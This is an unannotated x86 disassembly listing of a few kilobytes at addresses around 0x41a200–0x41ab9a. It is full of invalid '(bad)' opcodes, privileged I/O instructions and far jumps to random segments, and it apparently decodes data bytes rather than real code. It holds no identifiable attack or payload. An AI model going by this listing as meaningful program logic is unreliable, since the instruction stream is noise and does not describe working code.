  41a211:	loopne 0x41a256
  41a213:	push   es
  41a214:	jb     0x41a1d0
  41a216:	xchg   esi,eax
  41a217:	inc    esp
  41a218:	and    DWORD PTR [ecx-0xd1d15f0],esi
  41a21e:	lods   eax,DWORD PTR ds:[esi]
  41a21f:	mov    eax,0x7fa2d3cb
  41a224:	jge    0x41a246
  41a226:	outs   dx,DWORD PTR ds:[esi]
  41a227:	xchg   esp,eax
  41a228:	mov    eax,0x4508d243
  41a22d:	pop    ecx
  41a22e:	xchg   ebp,eax
  41a22f:	push   ds
  41a230:	stos   DWORD PTR es:[edi],eax
  41a231:	scas   al,BYTE PTR es:[edi]
  41a232:	(bad)  [eax-0x10]
  41a235:	dec    ebx
  41a236:	loop   0x41a259
  41a238:	fisubr WORD PTR [esp+ebx*1-0x46]
  41a23c:	jmp    0x3b8b:0x1f72bdcb
  41a243:	pop    edi
  41a244:	(bad)  
  41a245:	out    dx,eax
  41a246:	ins    BYTE PTR es:[edi],dx
  41a247:	mov    WORD PTR [ebp-0x5ed0d433],ds
  41a24d:	inc    ebx
  41a24e:	frstor [ecx-0x63a26b51]
  41a254:	leave  
  41a255:	call   0x6e18:0x3dd11374
  41a25c:	dec    edx
  41a25d:	outs   dx,BYTE PTR ds:[esi]
  41a25e:	dec    esp
  41a25f:	loop   0x41a2d5
  41a261:	jmp    0x4ac368a5
  41a266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a267:	jecxz  0x41a27f
  41a269:	aas    
  41a26a:	push   edi
  41a26b:	pop    ecx
  41a26c:	pusha  
  41a26d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a26e:	xor    BYTE PTR [edx],al
  41a270:	pushf  
  41a271:	imul   ebx,DWORD PTR [ebp+0x70],0x54
  41a275:	push   eax
  41a276:	ja     0x41a232
  41a278:	hlt    
  41a279:	ss ds cmp al,0xdd
  41a27d:	loopne 0x41a2f5
  41a27f:	pcmpgtw mm0,QWORD PTR [esi+0x33e0ed72]
  41a286:	(bad)  
  41a287:	ja     0x41a24d
  41a289:	into   
  41a28a:	icebp  
  41a28b:	adc    dh,al
  41a28d:	fwait
  41a28e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a28f:	lds    ebp,FWORD PTR [ebx]
  41a291:	ffreep st(3)
  41a293:	int3   
  41a294:	xor    dl,ah
  41a296:	fisubr DWORD PTR [eax+0x10]
  41a299:	addr16 hlt 
  41a29b:	addr16 push ebp
  41a29d:	fs push ebp
  41a29f:	hlt    
  41a2a0:	rcr    edx,1
  41a2a2:	mov    ah,0xf4
  41a2a4:	adc    eax,0x1e5f46cf
  41a2a9:	dec    eax
  41a2aa:	sbb    esp,DWORD PTR [esp+esi*2-0x29518ba5]
  41a2b1:	in     al,dx
  41a2b2:	xchg   ecx,eax
  41a2b3:	(bad)  
  41a2b4:	fadd   DWORD PTR [edx]
  41a2b6:	ds push ebx
  41a2b8:	scas   eax,DWORD PTR es:[edi]
  41a2b9:	cmp    eax,0x3abbed40
  41a2be:	(bad)  
  41a2bf:	or     eax,DWORD PTR [ecx+0x70]
  41a2c2:	xchg   DWORD PTR [edx-0x32bd781b],ecx
  41a2c8:	cmp    eax,eax
  41a2ca:	xchg   edi,eax
  41a2cb:	add    DWORD PTR [eax+ecx*8+0x67f1e32f],eax
  41a2d2:	test   DWORD PTR [edi+0x6e87acba],edi
  41a2d8:	fiadd  WORD PTR [ecx-0x7e998d1b]
  41a2de:	out    dx,eax
  41a2df:	fwait
  41a2e0:	mov    esp,0xa2bdcb62
  41a2e5:	push   ebp
  41a2e6:	aad    0xfa
  41a2e8:	adc    al,0x28
  41a2ea:	repz inc ecx
  41a2ec:	push   eax
  41a2ed:	or     al,BYTE PTR [edx+ecx*2]
  41a2f0:	pop    edi
  41a2f1:	or     esp,DWORD PTR [esi+0x68]
  41a2f4:	stos   DWORD PTR es:[edi],eax
  41a2f5:	idiv   BYTE PTR [edx-0x38]
  41a2f8:	dec    edx
  41a2f9:	sbb    BYTE PTR [ebx+0x3d212e57],dl
  41a2ff:	add    eax,0x2a0f84f8
  41a304:	adc    ebx,edi
  41a306:	adc    eax,0xb1772a3d
  41a30b:	pop    ebp
  41a30c:	repnz xchg bh,dh
  41a30f:	sbb    DWORD PTR [eax],eax
	...
  41a371:	add    BYTE PTR [eax],al
  41a373:	add    bh,dh
  41a375:	pop    eax
  41a376:	test   al,0x13
  41a378:	scas   eax,DWORD PTR es:[edi]
  41a379:	repz (bad) 
  41a37b:	cld    
  41a37c:	adc    eax,0x5fa6955c
  41a381:	or     edi,edx
  41a383:	in     al,dx
  41a384:	call   0x441a49e
  41a389:	add    DWORD PTR [eax],eax
  41a38b:	add    dl,cl
  41a38d:	dec    ebp
  41a38e:	xchg   ecx,eax
  41a38f:	rcl    esp,0xfb
  41a392:	into   
  41a393:	mov    eax,ds:0x1abe55e1
  41a398:	jae    0x41a38f
  41a39a:	imul   ebp,DWORD PTR [edi-0x354604d3],0xffffff97
  41a3a1:	test   al,0x65
  41a3a3:	xchg   ebp,eax
  41a3a4:	pop    edx
  41a3a5:	outs   dx,BYTE PTR ds:[esi]
  41a3a6:	jmp    0xbde244b2
  41a3ab:	jne    0x41a3cb
  41a3ad:	xchg   DWORD PTR [ecx-0x43],ebx
  41a3b0:	leave  
  41a3b1:	test   BYTE PTR [ecx],dh
  41a3b3:	imul   edi,DWORD PTR [edx+0x4a40cb5],0x52
  41a3ba:	pop    ecx
  41a3bb:	gs mov bh,0x13
  41a3be:	push   es
  41a3bf:	pop    ebp
  41a3c0:	mov    al,ds:0x849ad356
  41a3c5:	adc    edi,eax
  41a3c7:	es pushf 
  41a3c9:	xor    BYTE PTR [ecx],bl
  41a3cb:	or     ebx,DWORD PTR [ebp-0x78]
  41a3ce:	push   es
  41a3cf:	in     al,dx
  41a3d0:	(bad)  
  41a3d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3d2:	(bad)  
  41a3d4:	int    0x95
  41a3d6:	pop    edi
  41a3d7:	jmp    0x69b2:0xc73b1239
  41a3de:	add    al,BYTE PTR [edi+0x27]
  41a3e1:	push   0x52
  41a3e3:	dec    ebp
  41a3e4:	mul    DWORD PTR [edx]
  41a3e6:	mov    dl,0x84
  41a3e8:	xor    edx,DWORD PTR [ebx+0x78a90d24]
  41a3ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3ef:	jecxz  0x41a389
  41a3f1:	pop    esp
  41a3f2:	fwait
  41a3f3:	add    eax,0x8d068ee0
  41a3f8:	call   0x9eb5:0x6ebeb55
  41a3ff:	dec    edx
  41a400:	adc    ecx,edi
  41a402:	sbb    esp,DWORD PTR [edx+0xa]
  41a405:	mov    esp,0x65f4206d
  41a40a:	pop    es
  41a40b:	nop
  41a40c:	mov    ch,BYTE PTR [edi-0x7a]
  41a40f:	mov    ds:0xf6210a13,al
  41a414:	jecxz  0x41a417
  41a416:	xlat   BYTE PTR ds:[ebx]
  41a417:	scas   eax,DWORD PTR es:[edi]
  41a418:	imul   ebp,DWORD PTR [ebp-0x40],0x9
  41a41c:	xchg   DWORD PTR [edx],ebx
  41a41e:	dec    ebp
  41a41f:	and    al,0x79
  41a421:	push   eax
  41a422:	mov    ecx,0x59ad687d
  41a427:	mov    ah,0xc3
  41a429:	imul   esp,DWORD PTR [esp+ebp*8-0x4b],0xffffffeb
  41a42e:	in     al,dx
  41a42f:	addr16 sbb al,0x5b
  41a432:	repz je 0x41a3d5
  41a435:	dec    edi
  41a436:	das    
  41a437:	mov    dl,0x93
  41a439:	mov    WORD PTR [ebp-0x77],cs
  41a43c:	and    DWORD PTR [edx],ebx
  41a43e:	adc    BYTE PTR [eax+0x75],0x5e
  41a442:	test   DWORD PTR [esi-0x70],0x45702247
  41a449:	iret   
  41a44a:	fs addr16 and eax,0x8e5efb9e
  41a451:	pop    edi
  41a452:	sbb    DWORD PTR [esi-0x71d98419],eax
  41a458:	aaa    
  41a459:	retf   0x95b2
  41a45c:	aad    0x5a
  41a45e:	outs   dx,BYTE PTR ds:[esi]
  41a45f:	add    DWORD PTR ss:[edi+0x7e48c13e],esp
  41a466:	mov    eax,ds:0x60b677a3
  41a46b:	popf   
  41a46c:	add    eax,0xf49c3116
  41a471:	aad    0xb
  41a473:	adc    DWORD PTR [edx+0x18a163cf],0x65631b9f
  41a47d:	dec    ecx
  41a47e:	std    
  41a47f:	cmp    DWORD PTR [edi+0x35],esp
  41a482:	dec    ecx
  41a483:	xor    al,0x93
  41a485:	jb     0x41a442
  41a487:	add    ch,BYTE PTR [edi+0x3be70b59]
  41a48d:	icebp  
  41a48e:	aas    
  41a48f:	std    
	...
  41a4f4:	mov    edi,0xff0fcf82
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	lods   al,BYTE PTR ds:[esi]
  41a501:	daa    
  41a502:	retf   
  41a503:	sub    esp,0x16
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    al,0x1
  41a50a:	add    BYTE PTR [eax],al
  41a50c:	jg     0x41a589
  41a50e:	sub    eax,0xcd65c8d7
  41a513:	ss xchg edi,eax
  41a515:	mov    al,ds:0xa3e6cb8a
  41a51a:	gs ds ja 0x41a580
  41a51e:	repnz retf 0x1013
  41a522:	cld    
  41a523:	lock cli 
  41a525:	retf   0x14cd
  41a528:	mov    al,ds:0x1f896203
  41a52d:	xchg   edi,eax
  41a52e:	popf   
  41a52f:	xchg   ebx,eax
  41a530:	sbb    eax,DWORD PTR [ebx]
  41a532:	and    BYTE PTR [esp+edi*2+0x254a5c15],bl
  41a539:	xlat   BYTE PTR ds:[ebx]
  41a53a:	xchg   ebp,eax
  41a53b:	mov    esp,DWORD PTR [ecx]
  41a53d:	push   esp
  41a53e:	push   edx
  41a53f:	jge    0x41a543
  41a541:	xchg   ecx,ecx
  41a543:	dec    esp
  41a544:	jecxz  0x41a4f3
  41a546:	adc    DWORD PTR [ecx-0x4cd14395],0x83c0af56
  41a550:	out    0x70,eax
  41a552:	sub    al,0xd9
  41a554:	pop    esi
  41a555:	test   DWORD PTR [ecx-0x75915f35],ebx
  41a55b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a55c:	(bad)  
  41a55d:	(bad)  
  41a55f:	js     0x41a5c7
  41a561:	mov    ebx,0x6680765f
  41a566:	jmp    0x41a518
  41a568:	out    dx,al
  41a569:	xchg   ebp,eax
  41a56a:	icebp  
  41a56b:	js     0x41a51b
  41a56d:	ffree  st(6)
  41a56f:	enter  0x5901,0xf8
  41a573:	into   
  41a574:	int    0x5d
  41a576:	sub    BYTE PTR [ecx-0x667f6fa6],ah
  41a57c:	js     0x41a5d5
  41a57e:	dec    edx
  41a57f:	inc    edi
  41a580:	je     0x41a50d
  41a582:	les    edx,FWORD PTR [eax+0x4e17c5b6]
  41a588:	xor    DWORD PTR [edi+esi*8],0xffffffc8
  41a58c:	mov    ecx,0xbd29cd8e
  41a592:	dec    edx
  41a593:	mov    al,ds:0x9780e1b6
  41a598:	popa   
  41a599:	dec    esp
  41a59a:	pop    ebp
  41a59b:	iret   
  41a59c:	std    
  41a59d:	inc    eax
  41a59e:	sbb    BYTE PTR [ebx],ch
  41a5a0:	fnstsw WORD PTR [eax+ebp*2-0x3a8c9ff]
  41a5a7:	test   BYTE PTR [ecx-0x64579e69],ch
  41a5ad:	mov    ecx,0xb825d160
  41a5b2:	xor    edi,DWORD PTR [esi]
  41a5b4:	adc    DWORD PTR [esi+0x4457435e],edi
  41a5ba:	sahf   
  41a5bb:	icebp  
  41a5bc:	jmp    0x7f03:0x1a3a1ff9
  41a5c3:	mov    esp,0x418f62a
  41a5c8:	jnp    0x41a5c3
  41a5ca:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41a5cc:	outs   dx,BYTE PTR ds:[esi]
  41a5cd:	mov    eax,0x80dab89a
  41a5d2:	xor    edi,DWORD PTR [edx]
  41a5d4:	jnp    0x41a5f9
  41a5d6:	inc    esi
  41a5d7:	push   0xffffffcd
  41a5d9:	or     DWORD PTR [ecx+0x78],ecx
  41a5dc:	ror    ecx,cl
  41a5de:	xor    DWORD PTR ds:0x9387ab3b,eax
  41a5e4:	cmp    esi,DWORD PTR [edx+0x27c8372b]
  41a5ea:	mov    dl,0x7d
  41a5ec:	jb     0x41a605
  41a5ee:	add    DWORD PTR fs:[edx-0x26],0xffffff9f
  41a5f3:	jns    0x41a66c
  41a5f5:	and    al,0x77
  41a5f7:	int    0xea
  41a5f9:	add    eax,0x290de9bf
  41a5fe:	dec    esp
  41a5ff:	fmul   DWORD PTR ds:0xb977a007
  41a605:	loope  0x41a62b
  41a607:	pop    edi
  41a608:	jg     0x41a5cb
  41a60a:	sbb    ebx,DWORD PTR [ecx-0x9]
  41a60d:	dec    ebx
  41a60e:	out    0x64,eax
	...
  41a674:	pop    esp
  41a675:	sub    al,BYTE PTR [ecx]
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x71c3a625
  41a682:	test   al,0x56
  41a684:	lock pop ss
  41a686:	add    DWORD PTR [eax],eax
  41a688:	add    al,0x1
  41a68a:	add    BYTE PTR [eax],al
  41a68c:	xchg   esi,eax
  41a68d:	xor    DWORD PTR [edi],ecx
  41a68f:	(bad)  
  41a690:	and    DWORD PTR [edx+0x156f8974],esi
  41a696:	mov    esp,0x6e28b196
  41a69b:	les    edx,FWORD PTR [eax-0x579f9536]
  41a6a1:	dec    esp
  41a6a2:	inc    ebp
  41a6a3:	xchg   ebp,eax
  41a6a4:	popf   
  41a6a5:	xchg   ecx,eax
  41a6a6:	adc    ah,ah
  41a6a8:	adc    al,0x8d
  41a6aa:	xor    eax,0x6a0884e1
  41a6af:	add    al,0xdf
  41a6b1:	or     eax,0x98ce394b
  41a6b6:	call   0x1284:0x4d5d33cc
  41a6bd:	jnp    0x41a6d8
  41a6bf:	cs gs inc esi
  41a6c2:	sti    
  41a6c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6c4:	push   esp
  41a6c5:	xchg   esp,eax
  41a6c6:	sbb    eax,0xa54185d1
  41a6cb:	pop    ss
  41a6cc:	pop    edi
  41a6cd:	test   eax,0xbeff2230
  41a6d2:	inc    ebp
  41a6d3:	cmp    esi,DWORD PTR [edx+0x7b]
  41a6d6:	sub    ebp,DWORD PTR [eax+ebx*4]
  41a6d9:	push   es
  41a6da:	push   esp
  41a6db:	xchg   ebp,eax
  41a6dc:	jb     0x41a6e3
  41a6de:	stos   BYTE PTR es:[edi],al
  41a6df:	mov    ebx,DWORD PTR [ebx+0x2be5ff]
  41a6e5:	jae    0x41a6ef
  41a6e7:	outs   dx,DWORD PTR ds:[esi]
  41a6e8:	inc    ebx
  41a6e9:	mov    ebx,0xa7344078
  41a6ee:	pop    edi
  41a6ef:	and    al,0xda
  41a6f1:	jne    0x41a766
  41a6f3:	out    dx,eax
  41a6f4:	shr    cl,cl
  41a6f6:	lahf   
  41a6f7:	dec    DWORD PTR [eax+0x8]
  41a6fa:	aas    
  41a6fb:	or     cl,BYTE PTR [ebp+0x24]
  41a6fe:	nop
  41a6ff:	cmp    al,0x58
  41a701:	test   BYTE PTR [edi+0x126b964e],ah
  41a707:	xchg   BYTE PTR [esi],dl
  41a709:	mov    edi,0xb0c18a0c
  41a70e:	xchg   edi,eax
  41a70f:	cld    
  41a710:	push   ebx
  41a711:	cmp    ecx,edi
  41a713:	fisttp DWORD PTR [eax]
  41a715:	sbb    al,0x7f
  41a717:	xchg   ebx,eax
  41a718:	scas   al,BYTE PTR es:[edi]
  41a719:	aaa    
  41a71a:	je     0x41a6fb
  41a71c:	fnstenv [edx+edi*4+0x3b]
  41a720:	or     eax,0x3ff4e841
  41a725:	mov    ebp,0x6405e215
  41a72a:	stos   DWORD PTR es:[edi],eax
  41a72b:	jmp    0xfd3a:0x9e2f4c36
  41a732:	mov    ds:0xf204fd0e,eax
  41a737:	mov    ds,WORD PTR [ecx+0x64]
  41a73a:	iret   
  41a73b:	sbb    DWORD PTR [esi-0x5bd79260],esi
  41a741:	fcom   QWORD PTR [edx-0x5ade8178]
  41a747:	fst    st(4)
  41a749:	add    edi,DWORD PTR [ecx-0x66]
  41a74c:	gs xchg esi,eax
  41a74e:	jecxz  0x41a733
  41a750:	ret    0xc6f8
  41a753:	jg     0x41a7c0
  41a755:	enter  0x159c,0xe5
  41a759:	ss lahf 
  41a75b:	push   esp
  41a75c:	inc    eax
  41a75d:	mov    ebx,0xf8d54908
  41a762:	dec    edi
  41a763:	push   ss
  41a764:	pop    eax
  41a765:	jmp    0x41a777
  41a767:	fadd   DWORD PTR [ebx+0x501f00b9]
  41a76d:	and    BYTE PTR [ecx+0x12],bh
  41a770:	mov    ch,BYTE PTR [edx]
  41a772:	and    eax,0x2cc73981
  41a777:	lods   eax,DWORD PTR ds:[esi]
  41a778:	fsubr  st(0),st
  41a77a:	out    dx,al
  41a77b:	xor    DWORD PTR [edx],eax
  41a77d:	lock mov ch,0xe5
  41a780:	shl    BYTE PTR [esi],1
  41a782:	cld    
  41a783:	add    ebp,edx
  41a785:	jno    0x41a7c2
  41a787:	cmp    ebp,DWORD PTR [ebp-0x286057d0]
  41a78d:	out    0xa9,al
  41a78f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  41a7f4:	repz xchg edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0xd65327ca,al
  41a801:	pop    ds
  41a802:	(bad)  
  41a804:	hlt    
  41a805:	sbb    BYTE PTR [ecx],al
  41a807:	add    BYTE PTR [ecx+eax*1],al
  41a80a:	add    BYTE PTR [eax],al
  41a80c:	xchg   edx,eax
  41a80d:	fisub  WORD PTR [esp+esi*1-0x5d]
  41a811:	or     bl,cl
  41a813:	adc    DWORD PTR [edi-0x10],esi
  41a816:	out    0x56,al
  41a818:	lods   eax,DWORD PTR ds:[esi]
  41a819:	out    dx,eax
  41a81a:	dec    ecx
  41a81b:	mov    BYTE PTR [edi],dh
  41a81d:	data16 sar BYTE PTR es:[eax-0x1c778200],1
  41a825:	nop
  41a826:	scas   eax,DWORD PTR es:[edi]
  41a827:	adc    al,0xed
  41a829:	scas   eax,DWORD PTR es:[edi]
  41a82a:	stos   DWORD PTR es:[edi],eax
  41a82b:	push   ebx
  41a82c:	repz rcl DWORD PTR [edi-0x37],cl
  41a830:	and    al,0x2
  41a832:	arpl   bx,di
  41a834:	adc    al,0xf6
  41a836:	lods   eax,DWORD PTR ds:[esi]
  41a837:	cmp    BYTE PTR [edi-0xf97b6b3],cl
  41a83d:	xchg   edi,eax
  41a83e:	inc    ecx
  41a83f:	sub    bl,bh
  41a841:	lea    edx,[ecx-0x5e]
  41a844:	ja     0x41a813
  41a846:	cmc    
  41a847:	and    BYTE PTR [edi-0x81abaf6],dl
  41a84d:	nop
  41a84e:	clc    
  41a84f:	mov    eax,ds:0x107cad46
  41a854:	mov    WORD PTR [edx],?
  41a856:	test   eax,0x58a3220
  41a85b:	jne    0x41a8c5
  41a85d:	out    dx,eax
  41a85e:	in     eax,dx
  41a85f:	xchg   ebp,eax
  41a860:	mov    ah,0x4b
  41a862:	std    
  41a863:	jg     0x41a89e
  41a865:	jecxz  0x41a85e
  41a867:	int    0xba
  41a869:	in     eax,0x9
  41a86b:	shl    BYTE PTR [esp+ecx*4-0x3b],cl
  41a86f:	mov    WORD PTR [edi-0x3ec60c76],?
  41a875:	push   ebp
  41a876:	jl     0x41a82a
  41a878:	sbb    ebx,DWORD PTR [esi+0x50]
  41a87b:	iret   
  41a87c:	and    BYTE PTR [ebp-0x2b],ah
  41a87f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a880:	(bad)  
  41a881:	iret   
  41a882:	mov    bh,0x7c
  41a884:	int3   
  41a885:	sub    al,0x23
  41a887:	sti    
  41a888:	lods   al,BYTE PTR ds:[esi]
  41a889:	iret   
  41a88a:	or     ch,ah
  41a88c:	jmp    0xfb115c57
  41a891:	xchg   esi,eax
  41a892:	inc    ebx
  41a893:	pushf  
  41a894:	pop    eax
  41a895:	aaa    
  41a896:	(bad)  
  41a897:	outs   dx,DWORD PTR ds:[esi]
  41a898:	hlt    
  41a899:	xchg   DWORD PTR [edi-0x1290c446],ebx
  41a89f:	inc    ecx
  41a8a0:	inc    ebx
  41a8a1:	pop    ebp
  41a8a2:	push   cs
  41a8a3:	xchg   esp,eax
  41a8a4:	push   0xa253ee3
  41a8a9:	adc    dl,dh
  41a8ab:	sub    BYTE PTR [eax+0x26],cl
  41a8ae:	sbb    bl,BYTE PTR [edx+0x23]
  41a8b1:	mov    bh,0xb7
  41a8b3:	mov    al,0x62
  41a8b5:	pop    ecx
  41a8b6:	xchg   edi,eax
  41a8b7:	int    0xbe
  41a8b9:	jmp    0x143d4130
  41a8be:	test   BYTE PTR [ecx],bl
  41a8c0:	dec    esp
  41a8c1:	sub    DWORD PTR [ebx],ebx
  41a8c3:	xor    eax,0xe3003dca
  41a8c8:	stc    
  41a8c9:	call   0x1edd:0x724868f5
  41a8d0:	jne    0x41a859
  41a8d2:	push   es
  41a8d3:	push   0xc91d78f3
  41a8d8:	neg    DWORD PTR [edi+0x4b]
  41a8db:	in     al,0xe0
  41a8dd:	xchg   ebp,eax
  41a8de:	xchg   ebp,eax
  41a8df:	push   es
  41a8e0:	mov    al,0xa1
  41a8e2:	lahf   
  41a8e3:	add    esp,DWORD PTR [esi+0x761dbf05]
  41a8e9:	pop    ebx
  41a8ea:	shl    DWORD PTR [ebp-0x6a],1
  41a8ed:	lock add esi,0x2
  41a8f1:	push   cs
  41a8f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8f3:	and    DWORD PTR ds:0x9c59c5ce,0x3e
  41a8fa:	out    0xd1,al
  41a8fc:	mov    ds:0x45d38a37,al
  41a901:	push   ebx
  41a902:	repnz mov ecx,0x8c93b77d
  41a908:	bound  ebp,QWORD PTR [edi+0x3a6f345]
  41a90e:	stos   BYTE PTR es:[edi],al
  41a90f:	call   0x41a914
	...
  41a974:	xor    eax,0xcf4a867e
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	std    
  41a981:	les    ebp,FWORD PTR [ebp+0x75]
  41a984:	clc    
  41a985:	sbb    DWORD PTR [ecx],eax
  41a987:	add    BYTE PTR [ecx+eax*1],al
  41a98a:	add    BYTE PTR [eax],al
  41a98c:	xchg   ebp,eax
  41a98d:	sbb    DWORD PTR [eax+0x37b43793],0x8439e8c1
  41a997:	test   BYTE PTR [ebp-0x639fcee9],bh
  41a99d:	or     eax,0x16a26a32
  41a9a2:	(bad)  
  41a9a4:	xchg   esi,eax
  41a9a5:	mov    bl,0x3
  41a9a7:	adc    al,0xcc
  41a9a9:	sub    eax,0xdbed3fc3
  41a9ae:	icebp  
  41a9af:	adc    al,0x68
  41a9b1:	std    
  41a9b2:	or     al,0x9d
  41a9b4:	retf   
  41a9b5:	in     eax,dx
  41a9b6:	mov    eax,ds:0xb0a4089e
  41a9bb:	and    dl,BYTE PTR [eax]
  41a9bd:	outs   dx,DWORD PTR ds:[esi]
  41a9be:	(bad)  
  41a9bf:	cwde   
  41a9c0:	pusha  
  41a9c1:	sub    edi,DWORD PTR [ecx+edx*2-0x80]
  41a9c5:	ret    0x4551
  41a9c8:	dec    eax
  41a9c9:	adc    BYTE PTR [esi+0x1bb09c2],ch
  41a9cf:	sbb    BYTE PTR [esi+0x13],bl
  41a9d2:	leave  
  41a9d3:	loop   0x41a9cf
  41a9d5:	xor    DWORD PTR [ecx],ebp
  41a9d7:	push   eax
  41a9d8:	int3   
  41a9d9:	jge    0x41a9e0
  41a9db:	call   0x4585:0x642f408f
  41a9e2:	lock jmp 0x41a9f6
  41a9e5:	out    0x64,al
  41a9e7:	daa    
  41a9e8:	stos   BYTE PTR es:[di],al
  41a9ea:	dec    esi
  41a9eb:	ins    DWORD PTR es:[edi],dx
  41a9ec:	iret   
  41a9ed:	rol    DWORD PTR [ecx],cl
  41a9ef:	(bad)  
  41a9f0:	jmp    DWORD PTR [ebp-0x7f7db804]
  41a9f6:	cwde   
  41a9f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9f8:	pop    esp
  41a9f9:	retf   0x2e29
  41a9fc:	mov    ebx,es
  41a9fe:	loope  0x41a9fc
  41aa00:	fidivr WORD PTR [ebx+0x444b3029]
  41aa06:	jl     0x41a9f9
  41aa08:	adc    dl,BYTE PTR [esi+0x20]
  41aa0b:	add    al,0xc5
  41aa0d:	or     al,0xde
  41aa0f:	sub    BYTE PTR [eax-0x3a8108b3],bh
  41aa15:	imul   esp,ebx,0x4d1636c4
  41aa1b:	icebp  
  41aa1c:	dec    edx
  41aa1d:	test   DWORD PTR [edi+0x633ee7f7],ecx
  41aa23:	aam    0x2d
  41aa25:	hlt    
  41aa26:	imul   DWORD PTR [eax]
  41aa28:	cmp    eax,0x930c15cb
  41aa2d:	popa   
  41aa2e:	sub    eax,0x2cb16512
  41aa33:	enter  0xb480,0xa8
  41aa37:	sti    
  41aa38:	in     eax,dx
  41aa39:	dec    esi
  41aa3a:	(bad)  
  41aa3b:	cmp    al,0xfe
  41aa3d:	cmp    edx,DWORD PTR [ebp+0x20d953ae]
  41aa43:	dec    edx
  41aa44:	sbb    BYTE PTR [ebp-0x763d70e8],ch
  41aa4a:	cmc    
  41aa4b:	sbb    DWORD PTR [edi+0x5],edi
  41aa4e:	pop    edx
  41aa4f:	xor    dl,BYTE PTR [esi-0x7f6aa3c2]
  41aa55:	push   es
  41aa56:	xor    eax,0x46b072c5
  41aa5b:	jae    0x41aa42
  41aa5d:	icebp  
  41aa5e:	cmp    eax,0xa11fffce
  41aa63:	out    dx,al
  41aa64:	sub    bh,ah
  41aa66:	dec    esi
  41aa67:	push   edi
  41aa68:	popf   
  41aa69:	test   BYTE PTR [ebp+edi*1+0x2fa5bba6],bh
  41aa70:	xor    al,0x2f
  41aa72:	mov    ebp,0x876fa13
  41aa77:	mov    bl,0x7f
  41aa79:	(bad)  
  41aa7a:	loopne 0x41aa7e
  41aa7c:	xor    eax,0xb6e5d5af
  41aa81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa82:	enter  0x101,0x4f
  41aa86:	gs push es
  41aa88:	in     eax,dx
  41aa89:	out    dx,eax
  41aa8a:	xchg   edx,eax
  41aa8b:	and    dh,BYTE PTR [ecx]
  41aa8d:	xor    eax,esi
  41aa8f:	xor    al,0x0
	...
  41aaf1:	add    BYTE PTR [eax],al
  41aaf3:	add    bh,dh
  41aaf5:	add    esp,ebx
  41aaf7:	mov    ah,0xfe
  41aaf9:	std    
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	into   
  41ab01:	add    bh,bl
  41ab03:	jae    0x41ab01
  41ab05:	sbb    al,BYTE PTR [ecx]
  41ab07:	add    BYTE PTR [ecx+eax*1],al
  41ab0a:	add    BYTE PTR [eax],al
  41ab0c:	mov    ds:0x47ff642b,al
  41ab11:	aad    0x4e
  41ab13:	(bad)  
  41ab14:	in     al,0xfe
  41ab16:	stos   DWORD PTR es:[edi],eax
  41ab17:	mov    ch,0x3b
  41ab19:	inc    esp
  41ab1a:	cs dec ebp
  41ab1c:	cmp    dl,cl
  41ab1e:	outs   dx,BYTE PTR ds:[esi]
  41ab1f:	sbb    al,BYTE PTR [eax-0xd9fbf2a]
  41ab25:	dec    esp
  41ab26:	pop    edi
  41ab27:	pop    ecx
  41ab28:	pushf  
  41ab29:	sbb    bh,ch
  41ab2b:	sub    esi,ebp
  41ab2d:	ret    
  41ab2e:	sub    esp,esi
  41ab30:	pop    edx
  41ab31:	adc    DWORD PTR [edi+0x4],ebx
  41ab34:	(bad)  
  41ab36:	add    BYTE PTR [eax-0x49],dh
  41ab39:	jne    0x41ab6a
  41ab3b:	sbb    ebx,esp
  41ab3d:	xchg   BYTE PTR [esp+eiz*8-0x56ac0fcd],cl
  41ab44:	cmp    edx,DWORD PTR [ebx+0x22]
  41ab47:	test   edx,ecx
  41ab49:	add    esp,DWORD PTR [ebp-0x55]
  41ab4c:	add    ah,ch
  41ab4e:	jecxz  0x41aae0
  41ab50:	xchg   edi,eax
  41ab51:	fst    DWORD PTR [ebp+0xb63a600]
  41ab57:	into   
  41ab58:	jb     0x41ab17
  41ab5a:	sbb    ah,0xce
  41ab5d:	imul   edx,DWORD PTR [esi+0x72a0249],0xffffff89
  41ab64:	(bad)  
  41ab65:	in     al,dx
  41ab66:	fmul   DWORD PTR [eax]
  41ab68:	scas   eax,DWORD PTR es:[edi]
  41ab69:	xor    eax,0x710f2144
  41ab6e:	push   ds
  41ab6f:	(bad)  
  41ab70:	outs   dx,BYTE PTR ds:[esi]
  41ab71:	data16 jo 0x41ab97
  41ab74:	in     al,0xcf
  41ab76:	in     al,dx
  41ab77:	mov    cl,0x98
  41ab79:	stos   DWORD PTR es:[edi],eax
  41ab7a:	daa    
  41ab7b:	jge    0x41abfb
  41ab7d:	push   0x9800c867
  41ab82:	mov    ch,0x77
  41ab84:	les    esi,FWORD PTR [ebp-0x30240e13]
  41ab8a:	in     al,0xe1
  41ab8c:	jo     0x41ab82
  41ab8e:	or     eax,0x20025304
  41ab93:	das    
  41ab94:	gs inc edi
  41ab96:	leave  
  41ab97:	stc    
  41ab98:	push   edi
  41ab99:	xchg   ebx,eax
  41ab9a:	loop   0x41abc4
